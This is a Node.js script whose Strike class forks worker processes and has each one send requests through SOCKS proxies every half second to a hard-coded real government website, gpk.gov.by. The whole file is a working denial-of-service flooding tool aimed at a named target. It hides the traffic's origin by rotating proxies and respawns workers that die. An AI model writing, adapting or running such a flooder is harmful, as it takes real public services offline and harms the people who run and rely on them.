const cron = require("node-cron");
const cluster = require("cluster");
const os = require("os");
const axios = require("axios");
const HttpsProxyAgent = require("https-proxy-agent");
const { SocksProxyAgent } = require("socks-proxy-agent");
const http = require("http");
const { Agent } = require("socks5-http-client");
const { socks5 } = require("./proxy.socks5");
const EventEmitter = require("events");
const ProxyChecker = require("./proxyChecker");

const numCPUs = os.cpus().length <= 2 ? 2 : os.cpus().length - 1;

class Strike {
  constructor() {
    this.counter = 0;
    this.eventEmitter = new EventEmitter();
    this.proxyChecker = new ProxyChecker();
  }

  async init() {
    if (cluster.isPrimary) {
      for (let i = 1; i <= numCPUs; i++) {
        this._fork();
      }

      const avaliableProxies = await this.proxyChecker.getProxies();
      this._axiosRejectInterceptor();

      if(!avaliableProxies.length) {
        return console.error("[Error]:", "No avaliable proxies");
      }

      for (const worker of Object.values(cluster.workers)) {
        worker.send(avaliableProxies);
      }

      cluster.on("exit", (worker, code, signal) => {
        console.error(`
          Worker died, id=${worker.id}, pid=${worker.process.pid}, signal=${signal}, code=${code}
        `);
        this._fork();
      });
    } else if (cluster.isWorker) {
      process.on("message", this._attack.bind(this));
      console.info("inited instance");
    }
  }

  _axiosRejectInterceptor() {
    axios.interceptors.response
      .use((response) => response, (error) => Promise.reject(error));
  }

  async _attack(avaliableProxies) {
    for(let server of avaliableProxies) {
      setInterval(async () => {
        try {
          const agent = new SocksProxyAgent(server);
          const link = "https://gpk.gov.by";
          const response = await axios({
            url: link,
            httpsAgent: agent,
            headers: {
              'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
            },
          });
  
          console.log(`Response status code: ${response.status || response.code}, Link: ${link}, Requests: ${this.counter}`);
          this.counter++;
        } catch (err) {
          if(err.isAxiosError) {
            const { code, status, message } = err.toJSON();
            console.error("[Error]:", "Code:", code || status, "Message:", message);
          } else {
            console.error("[Error]:", "Message:", err.message);
          }
        }
      }, 500);
    }
  }

  _fork() {
    const ENV = {
      NODE_OPTIONS: process.env.CHILD_NODE_OPTIONS,
    };
    cluster.fork(ENV);
  }

}

(function () {
  new Strike().init();
})();
